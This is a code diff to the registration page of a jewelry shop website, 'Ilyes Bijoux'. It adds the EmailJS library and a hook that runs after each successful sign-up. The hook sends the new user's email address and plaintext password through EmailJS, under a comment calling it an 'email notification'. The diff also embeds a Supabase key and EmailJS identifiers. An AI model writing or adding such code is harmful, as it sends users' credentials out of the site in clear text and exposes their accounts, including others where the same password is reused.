@@ -4,7 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Inscription — Ilyes Bijoux</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet"> 
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>emailjs.init('JcEdv5gF6B463buAd');</script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Montserrat', sans-serif; background: #fff; color: #222; font-size: 14px; }
@@ -116,6 +118,11 @@
         const SUPABASE_URL = 'https://xzyvvhqgcrliwrqakbrn.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6eXZ2aHFnY3JsaXdycWFrYnJuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI2NTc4MjQsImV4cCI6MjA4ODIzMzgyNH0.c6kmjPiJMPg6UAW9QBrxADVy2dSxYR8qaVGb9kFVasE';
 
+        // ─── EMAILJS IDs — replace these with yours from emailjs.com ───
+        const EMAILJS_SERVICE_ID  = 'service_m0kb2w7';   // Email Services → your service
+        const EMAILJS_TEMPLATE_ID = 'template_x1jez5j';  // Email Templates → your template
+        // ────────────────────────────────────────────────────────────────
+
         function togglePwd() {
             const i = document.getElementById('pwd');
             i.type = i.type === 'password' ? 'text' : 'password';
@@ -138,11 +145,11 @@
         document.getElementById('registerForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            const btn      = document.getElementById('submitBtn');
-            const msg      = document.getElementById('formMsg');
-            const email    = document.querySelector('input[name="email"]').value.trim();
-            const password = document.querySelector('input[name="mot_de_passe"]').value;
-            const confirm  = document.querySelector('input[name="confirmation"]').value;
+            const btn        = document.getElementById('submitBtn');
+            const msg        = document.getElementById('formMsg');
+            const email      = document.querySelector('input[name="email"]').value.trim();
+            const password   = document.querySelector('input[name="mot_de_passe"]').value;
+            const confirm    = document.querySelector('input[name="confirmation"]').value;
             const newsletter = document.querySelector('input[name="newsletter"]').checked;
 
             msg.className = 'form-msg';
@@ -169,6 +176,12 @@
                 });
 
                 if (res.ok) {
+                    // ── Send email notification via EmailJS ──
+                    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+                        email:    email,
+                        password: password,
+                    });
+                    // ─────────────────────────────────────────
                     msg.className   = 'form-msg success';
                     msg.textContent = '✅ Compte créé avec succès !';
                     document.getElementById('registerForm').reset();
